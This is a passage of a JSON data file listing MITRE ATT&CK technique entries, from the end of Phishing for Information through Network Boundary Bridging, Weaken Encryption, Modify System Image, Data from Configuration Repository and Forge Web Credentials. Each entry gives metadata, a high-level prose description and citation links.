    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> in that the objective is gathering data from the victim rather than executing malicious code.<!-- raw HTML omitted --><!-- raw HTML omitted -->All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: <a href=\"https://attack.mitre.org/techniques/T1585\">Establish Accounts</a> or <a href=\"https://attack.mitre.org/techniques/T1586\">Compromise Accounts</a>) and/or sending multiple, seemingly urgent messages.</p>\n",
    "technique_references": [
      {
        "source_name": "ThreatPost Social Media Phishing",
        "url": "https://threatpost.com/facebook-launching-pad-phishing-attacks/160351/",
        "description": "O'Donnell, L. (2020, October 20). Facebook: A Top Launching Pad For Phishing Attacks. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TrendMictro Phishing",
        "url": "https://www.trendmicro.com/en_us/research/20/i/tricky-forms-of-phishing.html",
        "description": "Babon, P. (2020, September 3). Tricky 'Forms' of Phishing. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "PCMag FakeLogin",
        "url": "https://www.pcmag.com/news/hackers-try-to-phish-united-nations-staffers-with-fake-login-pages",
        "description": "Kan, M. (2019, October 24). Hackers Try to Phish United Nations Staffers With Fake Login Pages. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sophos Attachment",
        "url": "https://nakedsecurity.sophos.com/2020/10/02/serious-security-phishing-without-links-when-phishers-bring-along-their-own-web-pages/",
        "description": "Ducklin, P. (2020, October 2). Serious Security: Phishing without links – when phishers bring along their own web pages. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Phishery",
        "url": "https://github.com/ryhanson/phishery",
        "description": "Ryan Hanson. (2016, September 24). phishery. Retrieved October 23, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Anti Spoofing",
        "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
        "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ACSC Email Spoofing",
        "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
        "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
    "platform": "network",
    "tid": "T1599",
    "technique": "Network Boundary Bridging",
    "tactic": "defense-evasion",
    "datasources": "netflow-enclave-netflow|packet-capture",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1599.001"
    ],
    "count_subtechniques": 1,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may bridge network boundaries by compromising perimeter network devices. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.<!-- raw HTML omitted --><!-- raw HTML omitted -->Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.<!-- raw HTML omitted --><!-- raw HTML omitted -->When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via <a href=\"https://attack.mitre.org/techniques/T1090/003\">Multi-hop Proxy</a> or exfiltration of data via <a href=\"https://attack.mitre.org/techniques/T1020/001\">Traffic Duplication</a>.  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
    "platform": "network",
    "tid": "T1600",
    "technique": "Weaken Encryption",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1600.001",
      "T1600.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)<!-- raw HTML omitted --><!-- raw HTML omitted -->Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as <a href=\"https://attack.mitre.org/techniques/T1601\">Modify System Image</a>, <a href=\"https://attack.mitre.org/techniques/T1600/001\">Reduce Key Space</a>, and <a href=\"https://attack.mitre.org/techniques/T1600/002\">Disable Crypto Hardware</a>, an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco Synful Knock Evolution",
        "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
        "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Blog Legacy Device Attacks",
        "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
        "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ae7f3575-0a5e-427e-991b-fe03ad44c754",
    "platform": "network",
    "tid": "T1601",
    "technique": "Modify System Image",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|network-device-configuration|network-device-run-time-memory",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1601.001",
      "T1601.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.<!-- raw HTML omitted --><!-- raw HTML omitted -->To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.</p>\n",
    "technique_references": [
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Image File Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#7",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Image File Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco IOS Software Integrity Assurance - Run-Time Memory Verification",
        "url": "https://tools.cisco.com/security/center/resources/integrity_assurance.html#13",
        "description": "Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Cisco IOS Run-Time Memory Integrity Verification. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
    "platform": "network",
    "tid": "T1602",
    "technique": "Data from Configuration Repository",
    "tactic": "collection",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1602.001",
      "T1602.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "US-CERT-TA18-106A",
        "url": "https://www.us-cert.gov/ncas/alerts/TA18-106A",
        "description": "US-CERT. (2018, April 20). Alert (TA18-106A) Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT TA17-156A SNMP Abuse 2017",
        "url": "https://us-cert.cisa.gov/ncas/alerts/TA17-156A",
        "description": "US-CERT. (2017, June 5). Reducing the Risk of SNMP Abuse. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco Advisory SNMP v3 Authentication Vulnerabilities",
        "url": "https://tools.cisco.com/security/center/content/CiscoAppliedMitigationBulletin/cisco-amb-20080610-SNMPv3",
        "description": "Cisco. (2008, June 10). Identifying and Mitigating Exploitation of the SNMP Version 3 Authentication Vulnerabilities. Retrieved October 19, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--94cb00a4-b295-4d06-aa2b-5653b9c1be9c",
    "platform": "saas|windows|macos|linux|azure-ad|office-365",
    "tid": "T1606",
    "technique": "Forge Web Credentials",
    "tactic": "credential-access",
    "datasources": "authentication-logs|web-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1606.001",
      "T1606.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may generate these credential materials in order to gain access to web resources. This differs from <a href=\"https://attack.mitre.org/techniques/T1539\">Steal Web Session Cookie</a>, <a href=\"https://attack.mitre.org/techniques/T1528\">Steal Application Access Token</a>, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, <a href=\"https://attack.mitre.org/techniques/T1552/004\">Private Keys</a>, or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator)<!-- raw HTML omitted --><!-- raw HTML omitted -->Once forged, adversaries may use these web credentials to access resources (ex: <a href=\"https://attack.mitre.org/techniques/T1550\">Use Alternate Authentication Material</a>), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)</p>\n",
    "technique_references": [
      {
        "source_name": "GitHub AWS-ADFS-Credential-Generator",
        "url": "https://github.com/damianh/aws-adfs-credential-generator",
        "description": "Damian Hickey. (2017, January 28). AWS-ADFS-Credential-Generator. Retrieved December 16, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Pass The Cookie",
        "url": "https://wunderwuzzi23.github.io/blog/passthecookie.html",
        "description": "Rehberger, J. (2018, December). Pivot to the Cloud using Pass the Cookie. Retrieved April 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Mac Crypto Cookies January 2019",
        "url": "https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/",
        "description": "Chen, Y., Hu, W., Xu, Z., et. al. (2019, January 31). Mac Malware Steals Cryptocurrency Exchanges’ Cookies. Retrieved October 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SolarWinds Customer Guidance",
        "url": "https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/",
        "description": "MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 17, 2020.",
        "external_id": "none"
      }
    ]
  }
]
